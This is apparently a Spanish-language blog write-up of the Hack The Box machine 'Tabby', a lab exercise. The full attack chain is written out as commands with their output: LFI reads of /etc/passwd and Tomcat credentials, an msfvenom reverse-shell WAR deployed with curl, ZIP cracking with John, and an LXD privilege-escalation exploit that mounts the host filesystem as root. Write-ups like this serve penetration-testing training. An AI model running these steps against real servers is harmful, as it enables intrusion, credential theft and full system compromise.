---
layout: single
title: Tabby - Hack The Box
excerpt: "Esta fue una máquina algo complicada, descubrimos que usa el servicio Tomcat y aplicamos Local File Inclusion (LFI) para poder enumerar distintos archivos como el /etc/passwd y logramos ver el tomcat-users.xml que tiene usuario y contraseña de ese servicio. Utilizamos curl para subir una aplicación web que contiene una Reverse Shell, dentro de la máquina copiamos en base64 un archivo .ZIP con el cual obtenemos la contraseña de un usuario. Por último, usamos el privilegio LXD para escalar privilegios, usando un Exploit."
date: 2023-05-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-tabby/tabby_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Linux
  - Tomcat
  - Local File Inclusion - LFI
  - Abusing Virtual Host Manager
  - Abusing Tomcat Text-Based Manager
  - Deploying Malicious WAR
  - Reverse Shell
  - Cracking ZIP
  - LXD Exploitation
  - OSCP Style
---
![](/assets/images/htb-writeup-tabby/tabby_logo.png)

Esta fue una máquina algo complicada, descubrimos que usa el servicio **Tomcat** y aplicamos **Local File Inclusion (LFI)** para poder enumerar distintos archivos como el **/etc/passwd** y logramos ver el **tomcat-users.xml** que tiene usuario y contraseña de ese servicio. Utilizamos **curl** para subir una aplicación web que contiene una **Reverse Shell**, dentro de la máquina copiamos en **base64** un archivo **.ZIP** con el cual obtenemos la contraseña de un usuario. Por último, usamos el privilegio **LXD** para escalar privilegios, usando un Exploit.

**IMPORTANTE**

Necesite ayuda con esta máquina porque estuve atorado un rato en algunas partes, honor a S4vitar por su ayuda y enseñansa:
* https://www.youtube.com/watch?v=hKCNrXXLClQ

<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Puerto 80</a></li>
				<li><a href="#Fuzz">Fuzzing</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#LFI">Aplicando Local File Inclusion</a></li>
				<li><a href="#WAR">Instalando Aplicación Web .WAR con CURL y Ganando Acceso</a></li>
				<li><a href="#Tomcat">Enumerando Máquina como Tomcat</a></li>
				<li><a href="#ZIP">Obteniendo Archivo .ZIP</a></li>
				<li><a href="#John">Obteniendo Contraseña de .ZIP con John y Convirtiendonos en Ash</a></li>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#LXD">Buscando y Configurando Exploit</a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>
Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```
ping -c 4 10.10.10.194                                              
PING 10.10.10.194 (10.10.10.194) 56(84) bytes of data.
64 bytes from 10.10.10.194: icmp_seq=1 ttl=63 time=141 ms
64 bytes from 10.10.10.194: icmp_seq=2 ttl=63 time=139 ms
64 bytes from 10.10.10.194: icmp_seq=3 ttl=63 time=146 ms
64 bytes from 10.10.10.194: icmp_seq=4 ttl=63 time=139 ms

--- 10.10.10.194 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 139.338/141.508/146.437/2.915 ms
```
Por el TTL sabemos que la máquina usa Linux, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>
```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.194 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 13:06 CST
Initiating SYN Stealth Scan at 13:06
Scanning 10.10.10.194 [65535 ports]
Discovered open port 22/tcp on 10.10.10.194
Discovered open port 80/tcp on 10.10.10.194
Discovered open port 8080/tcp on 10.10.10.194
Completed SYN Stealth Scan at 13:07, 27.15s elapsed (65535 total ports)
Nmap scan report for 10.10.10.194
Host is up, received user-set (1.2s latency).
Scanned at 2023-05-12 13:06:38 CST for 27s
Not shown: 49399 filtered tcp ports (no-response), 16133 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.26 seconds
           Raw packets sent: 124283 (5.468MB) | Rcvd: 16192 (647.740KB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Vemos 3 puertos abiertos, aunque la movida seria por el puerto 80, recordemos que ya habíamos visto un puerto 8080, pues aquí corre el servicio Tomcat, comprobémoslo con el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>
```
nmap -sC -sV -p22,80,8080 10.10.10.194 -oN targeted                      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 13:14 CST
Nmap scan report for 10.10.10.194
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 453c341435562395d6834e26dec65bd9 (RSA)
|   256 89793a9c88b05cce4b79b102234b44a6 (ECDSA)
|_  256 1ee7b955dd258f7256e88e65d519b08d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.21 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Y ahí está, el servicio Tomcat en el puerto 8080, antes de ir a verlo, vamos a analizar primero el puerto 80.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="HTTP">Analizando Puerto 80</h2>

Entremos.

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura1.png">
</p>

Veo muchos campos que podemos analizar si sirven o no, veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura2.png">
</p>

Mmmmmm no veo algo que nos pueda ayudar, vayamos al puerto 8080, quizá encontremos algo útil:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura3.png">
</p>

Al parecer, es la página por default del servicio Tomcat, lo único que veo que nos pueda ayudar, es que está usando la versión 9, no es específica, pero ya tenemos una idea del servicio.

Regresemos a la página principal y veamos qué campos sirven.

Bueno, ninguno sirvió a excepción del **News**, pero nos lleva a este resultado:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura4.png">
</p>

Vamos a registrar el dominio en el **/etc/host** para ver si ya se logra ver:
```
nano /etc/host
10.10.10.194 megahosting.htb
```

Recarguemos la página, a ver si ya se ve:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura5.png">
</p>

Y ya se ve...pero pues no veo nada que nos pueda ayudar, más que esta página fue hecha en PHP y que está reproduciendo un archivo por el campo **file**, quizá la movida sea por ahí.

Veamos que pasa si eliminamos una sola letra del archivo **statement**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura6.png">
</p>

Interesante, no nos muestra nada, pero no marca ningún error, creo que la movida si es por aquí, pero vamos a hacer un **Fuzzing** para ver si nos reporta algo.

<h2 id="Fuzz">Fuzzing</h2>
```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.194/FUZZ/    
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.194/FUZZ/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                               
=====================================================================

000000001:   200        373 L    938 W      14175 Ch    "# directory-list-2.3-medium.txt"                                     
000000014:   200        373 L    938 W      14175 Ch    "http://10.10.10.194//"                                               
000000013:   200        373 L    938 W      14175 Ch    "#"                                                                   
000000012:   200        373 L    938 W      14175 Ch    "# on atleast 2 different hosts"                                      
000000011:   200        373 L    938 W      14175 Ch    "# Priority ordered case sensative list, where entries were found"    
000000010:   200        373 L    938 W      14175 Ch    "#"                                                                   
000000007:   200        373 L    938 W      14175 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"     
000000003:   200        373 L    938 W      14175 Ch    "# Copyright 2007 James Fisher"                                       
000000009:   200        373 L    938 W      14175 Ch    "# Suite 300, San Francisco, California, 94105, USA."                 
000000006:   200        373 L    938 W      14175 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"       
000000008:   200        373 L    938 W      14175 Ch    "# or send a letter to Creative Commons, 171 Second Street,"          
000000004:   200        373 L    938 W      14175 Ch    "#"                                                                   
000000005:   200        373 L    938 W      14175 Ch    "# This work is licensed under the Creative Commons"                  
000000002:   200        373 L    938 W      14175 Ch    "#"                                                                   
000000291:   403        9 L      28 W       277 Ch      "assets"                                                              
000000083:   403        9 L      28 W       277 Ch      "icons"                                                               
000000094:   403        9 L      28 W       277 Ch      "files"                                                               

Total time: 90.26488
Processed Requests: 14384
Filtered Requests: 14367
Requests/sec.: 159.3532
 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 28: Operation timed out after 90035 milliseconds with 0 bytes received
```
* -c: Para que se muestren los resultados con colores.
* --hc: Para que no muestre el código de estado 404, hc = hide code.
* -t: Para usar una cantidad específica de hilos.
* -w: Para usar un diccionario de wordlist.
* Diccionario que usamos: dirbuster

Mmmmm pues no, no hay nada que nos sirva, entonces la movida si es por la subpágina **News**, vayamos allá.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="LFI">Aplicando Local File Inclusion</h2>

Como vimos anteriormente, está configurado un directorio con el parámetro **file** que es el que está mostrando el archivo **statement**, entonces si puede mostrar archivos, quizá podamos ver los que contiene la máquina, vamos a probarlo tratando de ver el archivo **passwd** del directorio **/etc**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura7.png">
</p>

Vaya, vaya, vamos a aprovecharnos de esta vulnerabilidad, con **ctrl + u** se vera mejor:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura8.png">
</p>

Vemos un usuario llamado **ash**, quizá nos sirva después porque si tratas de listar su directorio, no verás nada. Lo que podemos hacer, es tratar de ver el archivo **tomcat-users.xml** que contendrá el usuario y contraseña del servicio **Tomcat**. Usemos la ruta que viene en la página por defecto que encontramos antes:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura9.png">
</p>

No se ve nada, a lo mejor lo muestra solo en la vista del código fuente:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura10.png">
</p>

Tampoco, entonces se movió este archivo hacia otro lado. Busquemos por internet, posibles rutas para este archivo.

Encontré algunas rutas que podemos probar:
* https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory

Podemos probar varias, pero la que nos servirá, será la siguiente: **/usr/share/tomcat9/etc/tomcat-users.xml**:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura11.png">
</p>

Como puedes observar, no se ve nada, pero sí vemos el código fuente:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura12.png">
</p>

Ya tenemos un usuario y contraseña del servicio **Tomcat**. 

Ahora, de acuerdo a la página **HackTricks**, existe un login para el servicio **Tomcat**, aquí también se encuentra la ruta para el archivo **tomcat-users.xml**:
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat

Intentemos entrar:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura13.png">
</p>

Si existe, pero si nos autenticamos nos saldrá la página de la imagen. Necesitamos buscar si esto es un error o hay un login diferente, mira este blog:
* https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html

Existe el login en **/host-manager/html**, vamos a probarlo:

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura14.png">
</p>

Muy bien, ya estamos autenticados, pero el problema es que no hay una opción para subir un archivo como en la **máquina Jerry**. Lo que nos dice **HackTricks** es que podemos incluir el archivo **.WAR** (que es una **Reverse Shell** que hacemos con **Msfvenom**) con la herramienta **curl**. Vamos a intentarlo.

<h2 id="WAR">Instalando Aplicación Web .WAR con CURL y Ganando Acceso</h2>

Lo principal, es que con **curl** podemos listar aplicaciones web, en este caso en **Tomcat**, añadiendo una ruta (**manager/text/list**) y el usuario y contraseña:
```
curl -s -X GET "http://10.10.10.194:8080/manager/text/list" -u 'tomcat:$3cureP4s5w0rd123!'
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
De esta forma podemos saber cuando metamos la **Reverse Shell**.

Ahora, crearemos el Payload con **Msfvenom**:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=Tu_IP LPORT=443 -f war -o revshell.war
Payload size: 1091 bytes
Final size of war file: 1091 bytes
Saved as: revshell.war
```
Y, cargamos el **.WAR** al servicio **Tomcat** con **curl**:
```
curl -s --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/reverse"
OK - Deployed application at context path [/reverse]
```
Si listamos otra vez las aplicaciones web, debería aparecer la que acabamos de subir:
```
curl -s -X GET "http://10.10.10.194:8080/manager/text/list" -u 'tomcat:$3cureP4s5w0rd123!'                                    
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/reverse:running:0:reverse
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```
Genial, solo levanta una netcat y entra en esa aplicación web:
```
nc -nvlp 443   
listening on [any] 443 ...
```

<p align="center">
<img src="/assets/images/htb-writeup-tabby/Captura15.png">
</p>

Observa la netcat, ya deberías estar conectado:
```
nc -nvlp 443   
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.194] 43382
whoami
tomcat
```

Obtén una shell interactiva y continuemos.

<h2 id="Tomcat">Enumerando Máquina como Tomcat</h2>

De una vez te digo, que no podrás hacer nada de nada.

Lo que debemos hacer, es tratar de ser usuario, ya que como **Tomcat** no podremos hacer nada. 
```
tomcat@tabby:/var/lib/tomcat9$ cd /home
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ cd ash
bash: cd: ash: Permission denied
```
Si recordamos el **Fuzzing** fallido, se había encontrado un directorio llamado **files**, vamos a buscarlo en el directorio **html**.
```
tomcat@tabby:/home$ cd /var/www/html/
tomcat@tabby:/var/www/html$ ls -la
total 48
drwxr-xr-x 4 root root  4096 Aug 19  2021 .
drwxr-xr-x 3 root root  4096 Aug 19  2021 ..
drwxr-xr-x 6 root root  4096 Aug 19  2021 assets
-rw-r--r-- 1 root root   766 Jan 13  2016 favicon.ico
drwxr-xr-x 4 ash  ash   4096 Aug 19  2021 files
-rw-r--r-- 1 root root 14175 Jun 17  2020 index.php
-rw-r--r-- 1 root root  2894 May 21  2020 logo.png
-rw-r--r-- 1 root root   123 Jun 16  2020 news.php
-rw-r--r-- 1 root root  1574 Mar 10  2016 Readme.txt
```
Si entramos en el directorio **files** encontraremos un archivo **.ZIP**, que sería un Backup:
```
tomcat@tabby:/var/www/html$ cd files/
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$ file 16162020_backup.zip 
16162020_backup.zip: Zip archive data, at least v1.0 to extract
```
Existe una forma de obtener este archivo **.ZIP**, está un poco complicado, pero está interesante el método.

<h2 id="ZIP">Obteniendo Archivo .ZIP</h2>

Para obtener este archivo en nuestra máquina, vamos a transformarlo en **base64**:
```
tomcat@tabby:/var/www/html/files$ base64 16162020_backup.zip 
UEsDBAoAAAAAAIUDf0gAAAAAAAAAAAAAAAAUABwAdmFyL3d3dy9odG1sL2Fzc2V0cy9VVAkAAxpv
/FYkaMZedXgLAAEEAAAAAAQAAAAAUEsDBBQACQAIALV9LUjibSsoUgEAAP4CAAAYABwAdmFyL3d3
dy9odG1sL2Zhdmljb24uaWNvVVQJAAMmcZZWQpvoXnV4CwABBAAAAAAEAAAAAN2Ez/9MJuhVkZcI
...
...
...
...
```
Copiamos la data y creamos un archivo en nuestra máquina, ahí pegaremos la data copiada y lo guardaremos:
```
nano Backup
Pegar y guardar
```
Ahora debemos convertirlo en un archivo **.ZIP**, para esto, ocupamos la kit de herramientas **Moreutils** de la cual utilizaremos **Sponge**, puedes descargarla desde tu terminal:
```
sponge                              
No se ha encontrado la orden «sponge», pero se puede instalar con:
apt install moreutils
¿Quiere instalarlo? (N/y)y
apt install moreutils
...
```
Y ya podremos convertir la data en el archivo **.ZIP**, cámbiale el nombre al archivo también:
```
base64 -d Backup | sponge data

ls
Backup  data

file data               
data: Zip archive data, at least v1.0 to extract, compression method=store

mv data BackUp.zip
```
Por último, abre el archivo con la herramienta **unzip**:
```
unzip BackUp.zip         
Archive:  BackUp.zip
   creating: var/www/html/assets/
[BackUp.zip] var/www/html/favicon.ico password: 
password incorrect--reenter:
```
Brgaa, tiene contraseña, es momento de utilizar a **John**.

<h2 id="John">Obteniendo Contraseña de .ZIP con John y Convirtiendonos en Ash</h2>

Para obtener la contraseña, simplemente vamos a usar una de las herramientas de **John** llamada **zip2john**. Lo que hará, será obtener un hash del **.ZIP**, con esto usaremos **John** para descifrar el hash y nos dé una contraseña:
```
zip2john BackUp.zip > hash                
ver 1.0 BackUp.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 BackUp.zip/var/www/html/favicon.ico PKZIP Encr: TS_chk, cmplen=338, decmplen=766, crc=282B6DE2 ts=7DB5 cs=7db5 type=8
...
...
```
Crackea el hash con **John**:
```
john -w=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 38.97% (ETA: 16:13:22) 0g/s 5607Kp/s 5607Kc/s 5607KC/s matyang..matwells
admin@it         (BackUp.zip)     
1g 0:00:00:01 DONE (2023-05-12 16:13) 0.5405g/s 5598Kp/s 5598Kc/s 5598KC/s adminf86..admin98
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
Ya tenemos la contraseña, te diría que la usaras para que vieras el **.ZIP**, pero esa cosa no tiene nada importante.

Resulta que la contraseña es la misma para convertirnos en el usuario **Ash**, úsala y obtén la flag:
```
tomcat@tabby:/var/www/html/files$ su ash
Password: 
ash@tabby:/var/www/html/files$ whoami
ash
ash@tabby:/var/www/html/files$ cd /home
ash@tabby:/home$ cd ash
ash@tabby:~$ ls -la
total 28
drwxr-x--- 3 ash  ash  4096 Aug 19  2021 .
drwxr-xr-x 3 root root 4096 Aug 19  2021 ..
lrwxrwxrwx 1 root root    9 May 21  2020 .bash_history -> /dev/null
-rw-r----- 1 ash  ash   220 Feb 25  2020 .bash_logout
-rw-r----- 1 ash  ash  3771 Feb 25  2020 .bashrc
drwx------ 2 ash  ash  4096 Aug 19  2021 .cache
-rw-r----- 1 ash  ash   807 Feb 25  2020 .profile
-r-------- 1 ash  ash    33 May 12 19:03 user.txt
ash@tabby:~$ cat user.txt
```
¡Excelente!, escalemos privilegios y acabemos con esto.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Post" style="text-align:center;">Post Explotación</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Si revisamos los grupos en los que se encuentra el usuario **ash**, veremos el siguiente:
```
ash@tabby:~$ id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```
Nos vamos a aprovechar del grupo **lxd**, busquemos un Exploit y configurémoslo.

<h2 id="LXD">Buscando y Configurando Exploit</h2>

```
searchsploit lxd                    
------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                        |  Path
------------------------------------------------------------------------------------------------------ ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                             | linux/local/46978.sh
------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Tenemos uno, vamos a copiarlo primero:
```
searchsploit -m linux/local/46978.sh
  Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
    Codes: N/A
 Verified: False
File Type: Bourne-Again shell script, Unicode text, UTF-8 text executable
```
Y vamos a analizarlo.

Para que funcione este Exploit, debemos descargar y ejecutar un archivo llamado **build-alpine** y luego, subir tanto el Exploit como el archivo generado del **build-alpine** hacia la máquina víctima. Hagámoslo por pasos:

* Descarga el archivo **build-alpine**:
```
wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2023-05-12 16:59:45--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.111.133, 185.199.108.133, 185.199.109.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.111.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8060 (7.9K) [text/plain]
Grabando a: «build-alpine»
build-alpine                      100%[=============================================================>]   7.87K  --.-KB/s    en 0s      
2023-05-12 16:59:45 (15.8 MB/s) - «build-alpine» guardado [8060/8060]
```
* Ejecuta el archivo **build-alpine**:
```
bash build-alpine             
Determining the latest release... v3.18
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.18/main/x86_64
Downloading alpine-keys-2.4-r1.apk
...
...
...
```
* Modifica el Exploit, elimina parte de la siguiente línea **&& lxc image list** de la función **createContainer**, así debería quedar esa función:
```
function createContainer(){
  lxc image import $filename --alias alpine && lxd init --auto
  echo -e "[*] Listing images...\n" 
  lxc init alpine privesc -c security.privileged=true
  lxc config device add privesc giveMeRoot disk source=/ path=/mnt/root recursive=true
  lxc start privesc
  lxc exec privesc sh
  cleanup
}
```
* Sube ambos archivos a la máquina víctima:
```
ash@tabby:/tmp$ wget http://Tu_IP/Lxd_Exploit.sh
--2023-05-12 23:04:57--  http://10.10.14.4/Lxd_Exploit.sh
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1434 (1.4K) [text/x-sh]
Saving to: ‘Lxd_Exploit.sh’
Lxd_Exploit.sh                                    0%[                                                                                   
Lxd_Exploit.sh                                  100%[====================================================================================================>]   1.40K  --.-KB/s    in 0.001s  
2023-05-12 23:04:57 (2.45 MB/s) - ‘Lxd_Exploit.sh’ saved [1434/1434]
```
```
ash@tabby:/tmp$ wget http://Tu_IP/alpine-v3.18-x86_64-20230512_1700.tar.gz
--2023-05-12 23:09:09--  http://10.10.14.4/alpine-v3.18-x86_64-20230512_1700.tar.gz
Connecting to 10.10.14.4:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3795739 (3.6M) [application/gzip]
Saving to: ‘alpine-v3.18-x86_64-20230512_1700.tar.gz’
...
```
* Mueve los archivos al directorio **/dev/shm**, esto porque sino nos dará problemas al usar el Exploit (no lo sabía hasta que lo use):
```
ash@tabby:/tmp$ mv Lxd_Exploit.sh alpine-v3.18-x86_64-20230512_1700.tar.gz /dev/shm
ash@tabby:/tmp$ cd /dev/shm
ash@tabby:/dev/shm$
```
* Exporta un **PATH** más grande para que funcione:
```
ash@tabby:/dev/shm$ export PATH=/root/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/bin/vendorl_perl:
```
* Activa el Exploit con el parámetro **-f** y agregando el comprimido:
```
ash@tabby:/dev/shm$ ./Lxd_Exploit.sh -f alpine-v3.18-x86_64-20230512_1700.tar.gz 
If this is your first time running LXD on this machine, you should also run: lxd init
To start your first instance, try: lxc launch ubuntu:18.04
Image imported with fingerprint: 8dce54570880176a4f116a60e0876a32853f9c2dfba9043d1a633a93f365dd77
[*] Listing images...
Creating privesc
Device giveMeRoot added to privesc         
~ # whoami
root
```

Para movernos a donde está la flag, debemos ir al directorio **/mnt**, pues así funciona este Exploit:
```
~ # cd ..
/ # cd mnt
/mnt # ls
root
/mnt # cd root
/mnt/root # ls
bin         cdrom       etc         lib         lib64       lost+found  mnt         proc        run         snap        sys         usr
boot        dev         home        lib32       libx32      media       opt         root        sbin        srv         tmp         var
/mnt/root # cd root
/mnt/root/root # ls
root.txt  snap
/mnt/root/root # cat root.txt
...
```
Y por fin, terminamos esta máquina.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* http://www.jtech.ua.es/j2ee/2003-2004/modulos/srv/sesion03-apuntes.htm
* https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory
* https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat
* https://comoinstalar.me/como-instalar-tomcat-en-centos-7/
* https://tomcat.apache.org/tomcat-9.0-doc/html-host-manager-howto.html
* https://www.youtube.com/watch?v=hKCNrXXLClQ


<br>
# FIN
